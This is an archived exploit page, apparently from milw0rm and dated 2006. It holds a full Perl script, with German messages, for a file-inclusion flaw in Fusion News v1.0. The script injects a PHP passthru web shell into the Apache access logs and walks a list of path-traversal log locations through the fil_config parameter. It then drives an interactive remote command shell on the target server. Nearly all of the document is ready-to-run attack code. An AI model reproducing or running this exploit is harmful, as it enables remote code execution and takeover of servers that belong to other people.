<html><head><title>Fusion News v.1.0 (fil_config) Remote File Inclusion Exploit</title></head><pre>#!/usr/bin/perl
use IO::Socket;

####################################################################################
#                                                                                  #
# Exploit coded by: X0r_1    						           #
# Bug found by:     X0r_1							   #						  
# release: 21.05.06     							   #
# 										   #
# vulnerable code in sources\post.php at lines 32-35:				   #
#----------------------------------------------------------------------------------#
#...  										   #	
#  global $VARS, $TEMPLATE, $fil_lang, $fil_config, $url_fs, $url_smil, $url_bbco; #
#  include     ($fil_config); 							   #	
#  include     (&quot;./sources/js.db.php&quot;);   					   #	
#... 									 	   #	
#----------------------------------------------------------------------------------#
# if register_globals = On you can overwrite the var $fil_config !    		   #	
####################################################################################

print &quot;==========================================================================\r\n&quot;;
print &quot;|            Fusion News v.1.0 Remote File Inclusion Exploit             |\r\n&quot;;
print &quot;|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|\r\n&quot;;  
print &quot;|  Bug found and exploit coded by: X0r_1                                 |\r\n&quot;;   
print &quot;|  works just with register_globals = On                                 |\r\n&quot;;       
print &quot;==========================================================================\r\n\n\n&quot;;


###############################################################################
## !!! Ziel $server und $path von Fusion News müssen eingetragen werden !!!  ##
###############################################################################
$server = &quot;127.0.0.1&quot;;
$path   = &quot;/news/&quot;;
###############################################################################

$code  = &quot;&lt;?php ob_clean();echo _StaRt_;passthru(\$_GET[cmd]);echo _EnD_;die; ?&gt;&quot;;



sub urlEncode 
{
    my ($string) = @_;
    $string =~ s/(\W)/&quot;%&quot; . unpack(&quot;H2&quot;, $1)/ge;
    #$string# =~ tr/.//;
    return $string;
}


sub inject
{
  $log = &quot;no&quot;;

  print &quot;[#]  Verbindung wird hergestellt . . .  \n&quot;;

$sock = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;$server, Timeout  =&gt; 10, PeerPort=&gt;&quot;http(80)&quot;)
        or die &quot;\n[X]  es konnte keine Verbindung hergestellt werden ! \n&quot;;

  print &quot;[#]  Verbindung hergestellt !  \n&quot;;
  print &quot;[#]  PHP Code wird in die Log Files Injected . . .  \n&quot;;

  print $sock &quot;GET &quot;.$path.&quot; &quot;.$code.&quot; HTTP/1.1\r\n&quot;;
  print $sock &quot;Host: &quot;.$server.&quot;\r\n&quot;;
  print $sock &quot;Connection: close\r\n\r\n&quot;;

  print &quot;[#]  PHP Code in Log File Injected !  \n\n&quot;;
  print &quot;[#]  Suche nach Log File Pfad \n&quot;;

# Hier können noch mehr mögliche Pfade zu den Server logs eingetragen werden !
#
@path= (
&quot;../../../../../../../../../../apache/logs/access.log&quot;,
&quot;../../../../../../../../../apache/logs/access.log&quot;,
&quot;../../../../../../../../apache/logs/access.log&quot;,
&quot;../../../../../../../apache/logs/access.log&quot;,
&quot;../../../../../../apache/logs/access.log&quot;,
&quot;../../../../../apache/logs/access.log&quot;,
&quot;../../../../apache/logs/access.log&quot;,
&quot;../../../apache/logs/access.log&quot;,
&quot;../../apache/logs/access.log&quot;,
&quot;../apache/logs/access.log&quot;,
&quot;../../../../../../../../../logs/access.log&quot;,
&quot;../../../../../../../../logs/access.log&quot;,
&quot;../../../../../../../logs/access.log&quot;,
&quot;../../../../../../logs/access.log&quot;,
&quot;../../../../../logs/access.log&quot;,
&quot;../../../../logs/access.log&quot;,
&quot;../../../logs/access.log&quot;,
&quot;../../logs/access.log&quot;,
&quot;../logs/access.log&quot;,

);



for ($i=0; $i&lt;=$#path; $i++)
  {
 
print &quot;   [+] Versuche &quot;.$path[$i].&quot;\n&quot;;

$sock = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;$server, Timeout  =&gt; 10, PeerPort=&gt;&quot;http(80)&quot;)
        or die &quot;\n[X]  es konnte keine Verbindung hergestellt werden ! \n&quot;;

  print $sock &quot;GET &quot;.$path.&quot;sources/post.php?fil_config=&quot;.$path[$i].&quot;&amp;cmd=echo%20startnow HTTP/1.1\r\n&quot;;
  print $sock &quot;Host: &quot;.$server.&quot;\r\n&quot;;
  print $sock &quot;Connection: close\r\n\r\n&quot;;

$out = &quot;&quot;;

    while ($answer = &lt;$sock&gt;) 
    {
    $out.=$answer;
    }
    close($sock);


if ($out =~ m/_StaRt_(.*?)_EnD_/ms)
  {
  print &quot;\n[#] Log File Pfad gefunden ! \n\n&quot;;
  print &quot;==========================================================================\n\n\n&quot;;
  $log = $i;
  $i = $#path

  } 
  }

if ($log eq &quot;no&quot;)
  { print &quot;\n\n[X] Log File Pfad konnte nicht gefunden werden ! \n\n&quot;; exit;}

}




sub exploit
{


$sock = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;$server, Timeout  =&gt; 10, PeerPort=&gt;&quot;http(80)&quot;)
        or die &quot;\n[X]  es konnte keine Verbindung hergestellt werden ! \n&quot;;

  print $sock &quot;GET &quot;.$path.&quot;sources/post.php?fil_config=&quot;.$path[$log].&quot;&amp;cmd=&quot;.&amp;urlEncode($cmd).&quot; HTTP/1.1\r\n&quot;;
  print $sock &quot;Host: &quot;.$server.&quot;\r\n&quot;;
  print $sock &quot;Connection: close\r\n\r\n&quot;;
 

 while ($answer = &lt;$sock&gt;) 
{
 $v .= $answer;
}
  close($sock);

          
if ($v =~ m/_StaRt_(.*?)_EnD_/ms)
  {
   print &quot;\n\n$1\n\n&quot;;
  }


$answer = &quot;&quot;;
     $v = &quot;&quot;;

&amp;getcmd;
}




sub getcmd
{

print &quot;\$Shell &gt; &quot;;
$cmd = &quot;&quot;;
$cmd = &lt;STDIN&gt;;
     chop($cmd);

if (!$cmd)
 {
 print &quot;\n&gt;&gt; [  Bitte geben Sie einen Befehl ein ! ]\n\n&quot;;
 &amp;getcmd;
 }

elsif ($cmd eq &quot;exit&quot;)
 {
 exit;
 }


&amp;exploit
}



  &amp;inject;
  &amp;getcmd;

# milw0rm.com [2006-05-21]</pre></html>